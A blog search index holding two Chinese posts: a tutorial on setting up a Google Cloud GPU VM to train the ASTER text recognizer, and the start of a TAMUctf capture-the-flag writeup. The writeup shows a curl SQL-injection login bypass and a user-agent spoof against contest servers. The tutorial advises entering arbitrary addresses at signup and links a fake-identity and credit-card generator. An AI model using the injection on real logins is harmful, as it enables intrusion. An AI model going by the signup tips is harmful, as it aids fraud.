<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>使用谷歌云进行深度学习训练，以aster为例</title>
      <link href="/190308-run-aster-on-gce-or-locally/"/>
      <url>/190308-run-aster-on-gce-or-locally/</url>
      
        <content type="html"><![CDATA[<p>光阴似箭，我也做起了毕业设计。随波逐流，我也玩起了深度学习。</p><p>深度学习需要较强的计算能力，在网络上找了一圈，列出一些可用的方案。</p><ul><li><a href="https://www.jikecloud.net" target="_blank" rel="noopener">极客云</a></li><li><a href="https://console.cloud.google.com/freetrial/signup/tos" target="_blank" rel="noopener">谷歌云</a> 。提供一年免费试用，但需要外币信用卡。</li><li>谷歌的<a href="https://www.138vps.com/jc/1325.html" target="_blank" rel="noopener">Colaboratory</a> </li><li><a href="https://net.xmu.edu.cn/19/47/c17463a334151/page.htm" target="_blank" rel="noopener">厦大HPC</a> </li><li><a href="https://item.taobao.com/item.htm?id=572068150187" target="_blank" rel="noopener">淘宝西电机房等</a> </li><li><a href="https://cloud.baidu.com/product/bdl.html" target="_blank" rel="noopener">百度深度学习平台</a> </li><li><a href="https://amazonaws-china.com/cn/free/" target="_blank" rel="noopener">AWS</a></li><li><a href="https://www.deepbrainchain.org/" target="_blank" rel="noopener">DeepBrain Chain</a></li><li>美团云 售罄</li><li><a href="https://blog.csdn.net/sinat_36256646/article/details/80745792" target="_blank" rel="noopener">滴滴云</a></li><li><a href="https://www.huaweicloud.com/product/hmi.html" target="_blank" rel="noopener">华为云</a></li><li>阿里云</li><li>参考文章<ul><li><a href="https://blog.csdn.net/cccat6/article/details/79057746" target="_blank" rel="noopener">机器学习深度学习云GPU资源与对比</a></li><li><a href="https://www.zhihu.com/question/51362855" target="_blank" rel="noopener">有没有云端的深度学习计算服务？</a>  </li></ul></li></ul><h1 id="基本环境"><a href="#基本环境" class="headerlink" title="基本环境"></a>基本环境</h1><p>在谷歌云上搭建起 <strong>Ubuntu16.04 + Python3.5 + tensorflow-gpu-1.4 + CUDA v8 + cuDNN v6</strong> 的环境。</p><h2 id="申请试用谷歌云"><a href="#申请试用谷歌云" class="headerlink" title="申请试用谷歌云"></a>申请试用谷歌云</h2><p>地址可随意填，记录两个。</p><p><code>台中市大甲区大甲里 邮编：43749</code> </p><p><code>California(加利福尼亚省) Adelanto(阿德兰托市) 邮编[ADELANTO CA 92301]</code> </p><h2 id="新建虚拟机"><a href="#新建虚拟机" class="headerlink" title="新建虚拟机"></a>新建虚拟机</h2><p>进入Google Cloud Platform -&gt; Compute Engine -&gt; VM 实例 ，通过“创建实例”新建一台虚拟机。</p><ul><li>机器类型中选择自定义来添加GPU数量和类型。</li><li>需要先按提示申请升级账户才能进行上述操作。很快会有邮件反馈申请成功。</li><li>自定义磁盘容量，防火墙允许流量。</li><li>点击创建得到一台全新的云端虚拟机。</li></ul><h2 id="远程访问"><a href="#远程访问" class="headerlink" title="远程访问"></a>远程访问</h2><ul><li>添加静态外部IP地址。在VM实例页面，实例右侧的设置处点击查看网络详情即可。</li><li>在Compute Engine -&gt; 元数据 中修改SSH 密钥。使用XHSELL或命令行工具生成密钥对后在云端按指定格式添加公钥，然后可在本地用私钥远程登陆。</li></ul><h2 id="安装Anaconda"><a href="#安装Anaconda" class="headerlink" title="安装Anaconda"></a>安装Anaconda</h2><ul><li><p><code>wget https://repo.continuum.io/archive/Anaconda3-4.2.0-Linux-x86_64.sh</code></p></li><li><p><code>chmod +x Anaconda3-4.2.0-Linux-x86_64.sh</code></p></li><li><p><code>./Anaconda3-4.2.0-Linux-x86_64.sh</code> 按提示选择，对于是否添加到PATH记得选yes。</p></li><li><p><code>source ~/.bashrc</code> 使conda等命令生效。</p></li><li><p><code>conda create -n tensorflow python=3.5</code>  建立虚拟环境。</p></li><li><p><code>source activate tensorflow</code> 激活环境。</p></li><li><p><code>pip install --ignore-installed --upgrade tensorflow-gpu==1.4.0</code> 安装tensorflow。</p></li><li><p><code>lspci -vnn | grep VGA -A 12</code> 查看显卡类型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(tensorflow) dfindneo@gaster:~/tf/aster/c_ops$ lspci -vnn | grep VGA -A 12</span><br><span class="line">00:03.0 Non-VGA unclassified device [0000]: Red Hat, Inc. Virtio SCSI [1af4:1004]</span><br><span class="line">        Subsystem: Red Hat, Inc. Virtio SCSI [1af4:0008]</span><br><span class="line">        Physical Slot: 3</span><br><span class="line">        Flags: bus master, fast devsel, latency 0, IRQ 11</span><br><span class="line">        I/O ports at c080 [size=64]</span><br><span class="line">        Memory at fd000000 (32-bit, non-prefetchable) [size=128]</span><br><span class="line">        Capabilities: &lt;access denied&gt;</span><br><span class="line">        Kernel driver <span class="keyword">in</span> use: virtio-pci</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">00:04.0 3D controller [0302]: NVIDIA Corporation GP100GL [Tesla P100 PCIe 16GB] [10de:15f8] (rev a1)</span><br><span class="line">        Subsystem: NVIDIA Corporation Device [10de:118f]</span><br><span class="line">        Physical Slot: 4</span><br><span class="line">        Flags: fast devsel, IRQ 11</span><br></pre></td></tr></table></figure></li></ul><h2 id="安装显卡驱动"><a href="#安装显卡驱动" class="headerlink" title="安装显卡驱动"></a>安装显卡驱动</h2><ul><li><p>访问<a href="https://www.nvidia.com/Download/index.aspx?lang=en-us" target="_blank" rel="noopener">NVIDIA官网</a> ，选择配置。<br><img src="1552054146667.png" alt="1552054146667"></p></li><li><p>点击search，看到对应的版本是384.66<br><img src="1552054275727.png" alt="1552054275727"></p></li><li><p>安装驱动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:graphics-drivers/ppa  </span><br><span class="line">sudo apt-get update  </span><br><span class="line">sudo apt-get install nvidia-384 <span class="comment">#此处要根据上面查询到的版本适当更改</span></span><br><span class="line">sudo apt-get install mesa-common-dev  </span><br><span class="line">sudo apt-get install freeglut3-dev</span><br><span class="line">sudo reboot -h now</span><br></pre></td></tr></table></figure></li><li><p>重启后可以使用<code>nvidia-smi</code> 命令查看是否安装成功。<br><img src="1552054400444.png" alt="1552054400444"></p></li></ul><h2 id="安装CUDA8-0"><a href="#安装CUDA8-0" class="headerlink" title="安装CUDA8.0"></a>安装CUDA8.0</h2><ul><li>我使用<code>sudo apt install nvidia-cuda-toolkit</code> 安装的CUDA是7.?版本的，使用<code>sudo apt remove nvidia-cuda*</code>  卸载掉了。</li><li>要安装CUDAv8.0，在<a href="https://developer.nvidia.com/cuda-80-ga2-download-archive" target="_blank" rel="noopener">这个页面</a>选择系统、架构、发行版及其版本，安装类型可选择runfile。如果是Ubuntu16.04，可直接 <code>wget https://developer.nvidia.com/compute/cuda/8.0/Prod2/local_installers/cuda_8.0.61_375.26_linux-run</code> ，然后 <code>sh  cuda_8.0.61_375.26_linux-run</code>  。</li><li>执行 <code>cd ~/NVIDIA_CUDA-8.0_Samples/1_Utilities/deviceQuery &amp;&amp; make &amp;&amp; ./deviceQuery</code> 。如果输出末尾有PASS字样，表示安装成功。</li><li>使用 <code>nvcc --version</code> 查看版本信息。<br><img src="1552056076810.png" alt="1552056076810"> </li></ul><h2 id="安装cuDNN6-0"><a href="#安装cuDNN6-0" class="headerlink" title="安装cuDNN6.0"></a>安装cuDNN6.0</h2><ul><li>登陆账号后访问 <code>https://developer.nvidia.com/compute/machine-learning/cudnn/secure/v6/prod/8.0_20170307/cudnn-8.0-linux-x64-v6.0-tgz</code>  ，点击下载，在chrome浏览器中按CTRL+J查看真实下载链接，暂停下载，然后在shell里wget该链接即可。下载后重命名文件为<code>cudnn-8.0-linux-x64-v6.0.tgz</code> 。</li><li><code>tar xzf cudnn-8.0-linux-x64-v6.0.tgz</code><br><code>sudo cp cuda/include/cudnn.h /usr/local/cuda/include/</code><br><code>sudo cp cuda/lib64/libcudnn* /usr/local/cuda/lib64/</code><br><code>sudo chmod a+r /usr/local/cuda/include/cudnn.h</code><br><code>sudo chmod a+r /usr/local/cuda/lib64/libcudnn*</code> </li><li>安装完成<br><img src="1552056065910.png" alt="1552056065910"></li></ul><p>到此为止深度学习的基本环境已经安装完成。可以在Compute Engine -&gt; 快照 中建立一个快照。</p><p>接下来记录想要复现和改进的模型 <code>aster</code>  的基本环境配置。</p><h1 id="ASTER环境"><a href="#ASTER环境" class="headerlink" title="ASTER环境"></a>ASTER环境</h1><h2 id="激活虚拟环境并安装依赖"><a href="#激活虚拟环境并安装依赖" class="headerlink" title="激活虚拟环境并安装依赖"></a>激活虚拟环境并安装依赖</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> activate tensorflow</span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install git cmake libcupti-dev build-essential protobuf-compiler unzip</span><br><span class="line">pip install --user protobuf tqdm numpy editdistance Pillow scipy matplotlib edit_distance</span><br></pre></td></tr></table></figure><h2 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir tf &amp;&amp; <span class="built_in">cd</span> tf</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/bgshih/aster.git</span><br></pre></td></tr></table></figure><h2 id="按照readme依次完成三步配置"><a href="#按照readme依次完成三步配置" class="headerlink" title="按照readme依次完成三步配置"></a>按照readme依次完成三步配置</h2><p>①<code>Go to c_ops/ and run build.sh to build the custom operators</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/tf/aster/c_ops</span><br><span class="line">chmod +x build.sh</span><br><span class="line">./build.sh</span><br></pre></td></tr></table></figure><p><img src="1552093922587.png" alt="1552093922587"></p><p><img src="1552092594436.png" alt="1552092594436"></p><p>②<code>Execute protoc aster/protos/*.proto --python_out=. to build the protobuf files</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/tf</span><br><span class="line">protoc aster/protos/*.proto --python_out=.</span><br></pre></td></tr></table></figure><p><img src="1552092638172.png" alt="1552092638172"></p><p>③<code>Add /path/to/aster to PYTHONPATH, or set this variable for every run</code> </p><p>在<code>~/.bashrc</code> 末尾加两行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export PYTHONPATH=&quot;$&#123;PYTHONPATH&#125;:/home/neo/tf/aster&quot;</span><br><span class="line">source activate tensorflow</span><br></pre></td></tr></table></figure><h2 id="下载作者提供的模型"><a href="#下载作者提供的模型" class="headerlink" title="下载作者提供的模型"></a>下载作者提供的模型</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/tf/aster/experiments/demo/</span><br><span class="line">wget  https://github.com/bgshih/aster/releases/download/v1.0.1/model-demo.zip</span><br><span class="line">unzip model-demo.zip</span><br></pre></td></tr></table></figure><h2 id="运行demo"><a href="#运行demo" class="headerlink" title="运行demo"></a>运行demo</h2><p> <code>python aster/demo.py</code> </p><p><img src="1552079776694.png" alt="1552079776694"></p><h2 id="数据集下载"><a href="#数据集下载" class="headerlink" title="数据集下载"></a>数据集下载</h2><h3 id="cute80"><a href="#cute80" class="headerlink" title="cute80"></a>cute80</h3><ul><li><a href="http://cs-chan.com/downloads_CUTE80_dataset.html" target="_blank" rel="noopener">主页</a> </li><li>下载：<a href="http://cs-chan.com/source/CUTE80_Dataset.zip" target="_blank" rel="noopener">CUTE80_Dataset.zip</a> (44 MB) </li></ul><h3 id="ic03"><a href="#ic03" class="headerlink" title="ic03"></a>ic03</h3><p><a href="http://www.iapr-tc11.org/mediawiki/index.php/ICDAR_2003_Robust_Reading_Competitions" target="_blank" rel="noopener">下载</a> </p><h3 id="ic13"><a href="#ic13" class="headerlink" title="ic13"></a>ic13</h3><ul><li><a href="http://dagdata.cvc.uab.es/icdar2013competition/?ch=2&amp;com=downloads" target="_blank" rel="noopener">主页</a> </li><li><a href="http://rrc.cvc.uab.es/?ch=2&amp;com=downloads" target="_blank" rel="noopener">下载</a> （注册账号后可见）</li></ul><h3 id="ic15"><a href="#ic15" class="headerlink" title="ic15"></a>ic15</h3><ul><li><a href="http://rrc.cvc.uab.es/?ch=4" target="_blank" rel="noopener">主页</a> </li><li><a href="http://rrc.cvc.uab.es/?ch=4&amp;com=downloads" target="_blank" rel="noopener">下载</a> （注册账号后可见）</li><li>文件说明</li></ul><p><strong><em>Downloads - Incidental Scene Text</em></strong><br>Download below the training dataset and associated ground truth information for each of the Tasks.</p><hr><p><strong><em>Task 4.1: Text Localization (2015 edition)</em></strong><br><strong>Training Set</strong><br>Training Set Images (88.5MB).- 1000 images obtained with wearable cameras</p><p>Training Set Localisation and Transcription Ground Truth (157KB).- 1000 text files with word level localisation and transcription ground truth</p><p><strong>Test Set</strong><br>Test Set Images (43.3MB).- 500 images obtained with wearable cameras. You can submit your results for this Task over the images of the test set through the My Methods section.</p><p>Test Set Ground Truth (244Kb). - 500 text files with text localisation bounding boxes for the images of the test set.</p><hr><p><strong><em>Task 4.2: Text Segmentation (N/A)</em></strong><br>Not available.</p><hr><p><strong><em>Task 4.3: Word Recognition (2015 edition)</em></strong><br><strong>Training Set</strong><br>Training Set Word Images, along with Transcriptions Ground truth (40.5MB).- ~4468 cut out word images corresponding to the axis oriented bounding boxes of the words are provided along with a single text file with the relative coordinates of the bounding shape within each word image. Transcription ground truth is provided in a single txt file.</p><p><strong>Test Set</strong><br>Test Set Word Images (21.5MB).- 2077 cut out word images corresponding to the axis oriented bounding boxes of the words are provided along with a single text file with the relative coordinates of the bounding shape within each word image. You can submit your results for this Task over the images of the test set through the My Methods section.</p><p>Test Set Ground Truth (49Kb). - A single text file with the transcriptions of the 2077 images of the test set. Each line corresponds to an image of the test set.</p><hr><p><strong><em>Task 4.4: End to End (2015 edition)</em></strong><br><strong>Training Set</strong><br>Training Set Images (88.5MB).- 1000 images obtained with wearable cameras</p><p>Training Set Vocabulary (16KB).- Vocabulary of all words (words of 3 characters or longer comprising only letters) appearing in the training set</p><p>Training Set Per-image Vocabularies (504KB).- Vocabularies of 100 words per image, comprising the words appearing in the image plus distractors</p><p>Training Set Localisation and Transcription Ground Truth (157KB).- 1000 text files with word level localisation and transcription ground truth</p><p><strong>Test Set</strong><br>Test Set Images (43.3MB).- 500 images obtained with wearable cameras. You can submit your results for this Task over the images of the test set through the My Methods section.</p><p>Test Set Vocabulary (8KB).- Vocabulary of all words (words of 3 characters or longer comprising only letters) appearing in the test set</p><p>Test Set Per-image Vocabularies (248KB).- Vocabularies of 100 words per image, comprising the words appearing in the image plus distractors</p><p>Test Set Ground Truth (244 Kb). - 500 text files with text localisation bounding boxes for the images of the test set.</p><hr><p><strong><em>Other</em></strong><br> Generic Vocabulary (796 KB).- A vocabulary of about 90 k words derived from the dataset publicly available here. Please consult [1,2] for further information as well as the disclaimer in the vocabulary file itself.</p><h3 id="iiit5k"><a href="#iiit5k" class="headerlink" title="iiit5k"></a>iiit5k</h3><ul><li><a href="http://cvit.iiit.ac.in/projects/SceneTextUnderstanding/IIIT5K.html" target="_blank" rel="noopener">主页</a> </li><li>下载：<a href="http://cvit.iiit.ac.in/projects/SceneTextUnderstanding/IIIT5K-Word_V3.0.tar.gz" target="_blank" rel="noopener">IIIT5K-Word_V3.0.tar.gz</a> (106 MB) </li></ul><h3 id="svt"><a href="#svt" class="headerlink" title="svt"></a>svt</h3><ul><li><a href="http://vision.ucsd.edu/~kai/svt/" target="_blank" rel="noopener">主页</a></li><li>下载：<a href="http://vision.ucsd.edu/~kai/svt/svt.zip" target="_blank" rel="noopener">Street View Text </a>(118MB)</li></ul><h3 id="synth90k"><a href="#synth90k" class="headerlink" title="synth90k"></a>synth90k</h3><ul><li><a href="http://www.robots.ox.ac.uk/~vgg/data/text/" target="_blank" rel="noopener">主页</a></li><li>下载：<a href="http://www.robots.ox.ac.uk/~vgg/data/text/mjsynth.tar.gz" target="_blank" rel="noopener">mjsynth.tar.gz</a> ( 10 GB )，解压后约34 G，生成的 tfrecord 约16 G。</li></ul><p><img src="1552092702860.png" alt="1552092702860"></p><h3 id="synthtext"><a href="#synthtext" class="headerlink" title="synthtext"></a>synthtext</h3><ul><li><a href="http://www.robots.ox.ac.uk/~vgg/data/scenetext/" target="_blank" rel="noopener">主页</a></li><li>下载：<a href="http://www.robots.ox.ac.uk/~vgg/data/scenetext/SynthText.zip" target="_blank" rel="noopener">SynthText.zip</a> 约40G</li></ul><h2 id="数据集处理"><a href="#数据集处理" class="headerlink" title="数据集处理"></a>数据集处理</h2><p>在 <code>~/tf/data</code> 目录下存放数据集文件夹，配置 <code>~/tf/aster/tools/creat_*.py</code> 中的输入输出目录，运行脚本可在数据集同目录下得到tfrecord文件。</p><p><img src="1552092743066.png" alt="1552092743066"></p><h2 id="训练"><a href="#训练" class="headerlink" title="训练"></a>训练</h2><p>在<code>~/tf/data/</code>目录下存放<code>tfrecord</code>文件；</p><p> 在<code>~/tf/aster/experiments/</code> 新建<code>train1</code> 文件夹，再在其中新建<code>config</code> 和 <code>log</code> 文件夹；</p><p>在<code>config</code> 文件夹内新建<code>trainval.prototxt</code> ，内容参照<code>~/tf/aster/experiments/demo/config/trainval.prototxt</code> 。</p><p>执行训练命令后在<code>~/tf/aster/experiments/train1/log</code> 目录下生成checkpoint文件等。</p><p>train :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/tf/</span><br><span class="line">python aster/train.py --exp_dir=aster/experiments/train1/ --num_clones=2</span><br></pre></td></tr></table></figure><p><img src="1552094702649.png" alt="1552094702649"></p><p>eval :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/tf/</span><br><span class="line">python aster/eval.py  --exp_dir=aster/experiments/train1/</span><br></pre></td></tr></table></figure><p><img src="1552093439964.png" alt="1552093439964"></p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="提高访问速度"><a href="#提高访问速度" class="headerlink" title="提高访问速度"></a>提高访问速度</h2><p>如果是位于国内的服务器，可更改部分操作以提高访问速度。</p><h3 id="修改Ubuntu更新源"><a href="#修改Ubuntu更新源" class="headerlink" title="修改Ubuntu更新源"></a>修改Ubuntu更新源</h3><p>编辑Ubuntu16.04的 <code>/etc/apt/source.list</code> 为以下内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse</span><br></pre></td></tr></table></figure><h3 id="使用ssh"><a href="#使用ssh" class="headerlink" title="使用ssh"></a>使用ssh</h3><p><code>sudo apt update &amp;&amp; sudo apt install openssh-server &amp;&amp; sudo service ssh start</code> </p><p><code>sudo apt install lrzsz</code> 安装 lrzsz 后用<code>sz</code> / <code>rz</code> 命令进行小文件传输，大文件用sftp。</p><h3 id="下载Anaconda"><a href="#下载Anaconda" class="headerlink" title="下载Anaconda"></a>下载Anaconda</h3><p><code>wget https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/Anaconda3-4.2.0-Linux-x86_64.sh</code> </p><h3 id="修改Anaconda软件源"><a href="#修改Anaconda软件源" class="headerlink" title="修改Anaconda软件源"></a>修改Anaconda软件源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/ </span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/</span><br><span class="line">conda config --<span class="built_in">set</span> show_channel_urls yes</span><br></pre></td></tr></table></figure><h3 id="修改pip源"><a href="#修改pip源" class="headerlink" title="修改pip源"></a>修改pip源</h3><ul><li><p><code>mkdir -p ~/.pip &amp;&amp; touch ~/.pip/pip.conf</code> </p></li><li><p>修改 <code>~/.pip/pip.conf</code> 内容为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">[install]</span><br><span class="line">trusted-host=mirrors.aliyun.com</span><br></pre></td></tr></table></figure></li></ul><p>（Windows下为 <code>C:\Users\USERNAME\AppData\Roaming\pip\pip.ini</code> ） </p><h2 id="克隆GitHub公开repo到私有"><a href="#克隆GitHub公开repo到私有" class="headerlink" title="克隆GitHub公开repo到私有"></a>克隆GitHub公开repo到私有</h2><p>GitHub前段时间已经支持免费使用私有仓库，可以将代码仓库镜像自己的私有仓库，更方便地记录代码更改。</p><ul><li><p>sudo apt install git</p></li><li><p>设置git配置和远程访问</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name findneo</span><br><span class="line">git config --global user.email username@gmail.com</span><br><span class="line">ssh-keygen -t rsa -b 4096 -C <span class="string">"usernameo@gmail.com"</span></span><br></pre></td></tr></table></figure></li><li><p>将~/.ssh/id_rsa.pub添加到GitHub的SSH keys。</p></li><li><p><code>ssh -T git@github.com</code> 测试是否成功</p></li><li><p>mirror 公开仓库 bgshih/aster 到 私有仓库 findneo/myaster</p><ul><li><p>在GitHub新建名为myaster的私有仓库</p></li><li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --bare https://github.com/bgshih/aster.git</span><br><span class="line"><span class="built_in">cd</span> aster.git</span><br><span class="line">git push -mirror https://github.com/findneo/myaster.git</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">rm -rf aster.git</span><br><span class="line">git <span class="built_in">clone</span> git@github.com:findneo/myaster.git</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="protocol-buffers"><a href="#protocol-buffers" class="headerlink" title="protocol buffers"></a>protocol buffers</h2><p>和XML/JSON/Thrift类似，优点在于简单，快，小，后向兼容，语言平台应用无关；缺点在于自解释性不够，不能表示很复杂的结构。</p><p>只要描述proto文件，就可以使用编译器protoc(支持c++/Java/Python)自动生成用于序列化、反序列化、读写对象的操作的代码。</p><h1 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h1><p>最后，感谢慷慨借用信用卡的朋友。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://www.xuezishi.net/" target="_blank" rel="noopener">学姿势 - 校园金融第一站</a> ——学习信用卡相关的姿势 </li><li><a href="http://www.haoweichi.com/" target="_blank" rel="noopener">美国人信息生成，美国身份生成-世界各国身份信息、地址、信用卡生成</a> </li><li><a href="https://developer.nvidia.com/cuda-toolkit-archive" target="_blank" rel="noopener">CUDA 下载</a> </li><li><a href="https://developer.nvidia.com/cudnn" target="_blank" rel="noopener">cuDNN下载</a> </li><li><a href="https://www.nvidia.com/Download/index.aspx?lang=en-us" target="_blank" rel="noopener">NVIDIA显卡驱动下载</a> </li><li><a href="https://www.cnblogs.com/zpcdbky/p/9757821.html" target="_blank" rel="noopener">保姆级教程——Ubuntu16.04 Server下深度学习环境搭建：安装CUDA8.0，cuDNN6.0，Bazel0.5.4，源码编译安装TensorFlow1.4.0(GPU版)</a>  </li><li><a href="https://www.cnblogs.com/pprp/p/9463974.html" target="_blank" rel="noopener">深度学习环境搭建：Tensorflow1.4.0+Ubuntu16.04+Python3.5+Cuda8.0+Cudnn6.0</a> </li><li>论文下载：<a href="http://www.vlrlab.net/admin/uploads/avatars/ASTER_An_Attentional_Scene_Text_Recognizer_with_Flexible_Rectification.pdf" target="_blank" rel="noopener">【PAMI2018】ASTER_An Attentional Scene Text Recognizer with Flexible Rectification.pdf</a> </li><li>代码仓库：<a href="https://github.com/bgshih/aster" target="_blank" rel="noopener">https://github.com/bgshih/aster</a>  </li><li><a href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/" target="_blank" rel="noopener">清华大学开源软件镜像站</a> <ul><li><a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/" target="_blank" rel="noopener">国内Anaconda下载</a> </li></ul></li><li><a href="https://repo.continuum.io/archive/" target="_blank" rel="noopener">国际Anaconda下载</a> </li><li><a href="https://help.github.com/en/articles/duplicating-a-repository" target="_blank" rel="noopener">Duplicating a repository</a> </li><li><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-gpb/index.html" target="_blank" rel="noopener">Google Protocol Buffer 的使用和原理</a> </li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>TAMUctf writeup</title>
      <link href="/190223-tamuctf/"/>
      <url>/190223-tamuctf/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Not-Another-SQLi-Challenge"><a href="#Not-Another-SQLi-Challenge" class="headerlink" title="Not Another SQLi Challenge"></a>Not Another SQLi Challenge</h2><p>尝试登陆时页面会发生跳转，可在chrome浏览器开发者工具中的Network栏勾选Preserve log保存报文内容，以便用于burp重放。</p><p>万能密码登录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$curl</span> -s <span class="string">"http://web1.tamuctf.com/web/login.php"</span> -d <span class="string">"username=admin' or 1=1#&amp;password"</span> | grep -o <span class="string">"gigem&#123;.*&#125;"</span></span><br><span class="line">gigem&#123;f4rm3r5_f4rm3r5_w3<span class="string">'r3_4ll_r16h7&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Robots-Rule"><a href="#Robots-Rule" class="headerlink" title="Robots Rule"></a>Robots Rule</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$curl</span> <span class="string">"http://web5.tamuctf.com/robots.txt"</span></span><br><span class="line">User-agent: *</span><br><span class="line"></span><br><span class="line">WHAT IS UP, MY FELLOW HUMAN!</span><br><span class="line">HAVE YOU RECEIVED SECRET INFORMATION ON THE DASTARDLY GOOGLE ROBOTS?!</span><br><span class="line">YOU CAN TELL ME, A FELLOW NOT-A-ROBOT!</span><br></pre></td></tr></table></figure><p>按提示伪装成Google机器人访问 robots.txt 。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">"http://web5.tamuctf.com/robots.txt"</span> -A <span class="string">"Googlebot/2.1 (+http://www.google.com/bot.html)"</span> -s | grep -o <span class="string">"gigem&#123;.*&#125;"</span></span><br><span class="line">gigem&#123;be3p-bOop_rob0tz_4-lyfe&#125;</span><br></pre></td></tr></table></figure><h2 id="Many-Gig’ems-to-you"><a href="#Many-Gig’ems-to-you" class="headerlink" title="Many Gig’ems to you!"></a>Many Gig’ems to you!</h2><blockquote><p><a href="http://web7.tamuctf.com/" target="_blank" rel="noopener">http://web7.tamuctf.com</a> </p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s http://web7.tamuctf.com/index.html | grep -oE <span class="string">'gigem&#123;[^"]+"'</span></span><br><span class="line">gigem&#123;flag_in_<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$ curl -s http://web7.tamuctf.com/cookies.html | grep -oE 'gigem&#123;[^"</span>]+<span class="string">"'</span></span><br><span 